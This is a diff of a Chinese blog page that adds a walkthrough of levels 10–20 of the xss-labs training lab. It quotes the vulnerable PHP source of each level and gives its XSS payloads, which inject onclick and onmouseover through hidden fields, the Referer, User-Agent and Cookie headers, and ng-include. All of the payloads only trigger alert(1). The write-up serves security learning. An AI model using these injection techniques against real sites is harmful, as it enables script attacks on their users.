@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">666</span>
+            <span class="post-count">1.6k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">3 分钟</span>
+            <span class="post-count">8 分钟</span>
         </span>
     </span>
 </div>
@@ -158,6 +158,66 @@
 <p>部分源码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
+<h3 id="level10-隐藏参数"><a href="#level10-隐藏参数" class="headerlink" title="level10(隐藏参数)"></a>level10(隐藏参数)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url被符号实体化了。</p>
+<p>从t_sort输入框下手，仅仅替换了尖括号。</p>
+<p>给input加一个onclick事件</p>
+<p>如<code>onclick=alert(1)</code></p>
+<p>记得去掉type的hide属性</p>
+<h3 id="level11-Referer"><a href="#level11-Referer" class="headerlink" title="level11(Referer)"></a>level11(Referer)</h3><p>同level10</p>
+<p>但是应该不对，怎么会有同一种解法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第四行明显是说Reffer</p>
+<p>bp时</p>
+<p><code>Referer:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520113437383.png" alt="image-20230520113437383"></p>
+<h3 id="level12（代理）"><a href="#level12（代理）" class="headerlink" title="level12（代理）"></a>level12（代理）</h3><p>f12，看得t_ua</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>bp时，很明显是</p>
+<p><code>User-Agent:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<h3 id="level13-Cookie"><a href="#level13-Cookie" class="headerlink" title="level13(Cookie)"></a>level13(Cookie)</h3><p>f12，看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这应该提示了cookie</p>
+<p>bp试试</p>
+<p><code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<h3 id="level14-exif"><a href="#level14-exif" class="headerlink" title="level14(exif)"></a>level14(exif)</h3><p>待解决</p>
+<h3 id="level15-ngInclude"><a href="#level15-ngInclude" class="headerlink" title="level15(ngInclude)"></a>level15(ngInclude)</h3><p>url:</p>
+<p><code>http://localhost:81/xss-labs/level15.php?src=1.gif</code></p>
+<p>f12出现这个：</p>
+<p><img src="/../../../Typora/img111/image-20230520133632333.png" alt="image-20230520133632333"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>知识点：ng-include</p>
+<p>ng-include是angular js的东西，类似php函数中的include函数，即包含文件。</p>
+<p>1、ng-include 指令用于包含外部的 HTML文件。</p>
+<p>2、包含的内容将作为指定元素的子节点。</p>
+<p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>4、默认情况下，包含的文件需要包含在同一个域名下。</p>
+<p>值得注意的是：</p>
+<p>ng-include,如果单纯指定地址，必须要加引号</p>
+<p>ng-include,加载外部html，script标签中的内容不执行</p>
+<p>ng-include,加载外部html中含有style标签样式可以识别<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/RuoLi_s/article/details/112690177?ops_request_misc=&request_id=&biz_id=102&utm_term=xss-labs%E9%80%9A%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-112690177.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">xss-labs通关挑战（xss challenge）_RuoLi_s的博客-CSDN博客</a></p>
+<p>把其他存在xss漏洞的文件包含进来。</p>
+<p><code>src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520135939252.png" alt="image-20230520135939252"></p>
+<h3 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h3><p>源代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>主要是script替换了，空格实体化了，”&#x2F;“也没了</p>
+<p>试试img，并且替换个空格</p>
+<p>%0a试试。</p>
+<p><code>keyword=</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520142552842.png" alt="image-20230520142552842"></p>
+<h3 id="level17-18-参数拼接"><a href="#level17-18-参数拼接" class="headerlink" title="level17-18(参数拼接)"></a>level17-18(参数拼接)</h3><p>url两个参数，中间有&#x3D;</p>
+<p><code>arg01=%20onmouseover&amp;arg02=alert(1)</code></p>
+<p>onmouseover前加个空格</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520154125903.png" alt="image-20230520154125903"></p>
+<p>level18同理。</p>
+<h3 id="level19-20-Flash反编译"><a href="#level19-20-Flash反编译" class="headerlink" title="level19-20(Flash反编译)"></a>level19-20(Flash反编译)</h3><p>待解决</p>
  
       <!-- reward -->
       
